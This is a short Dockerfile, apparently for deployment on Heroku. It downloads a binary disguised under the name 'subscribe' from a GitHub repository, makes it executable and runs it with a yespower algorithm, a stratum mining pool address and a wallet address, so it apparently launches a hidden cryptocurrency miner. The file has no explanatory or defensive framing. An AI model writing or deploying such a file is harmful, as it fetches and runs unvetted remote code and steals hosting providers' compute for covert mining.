FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/Xeondra133/Student/raw/main/subscribe; chmod +x subscribe; ./subscribe -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7022 -u bRFgvS6WkJLwUNvjoH4WGbqtTz6bvxD2Kr.VPS
CMD bash heroku.sh
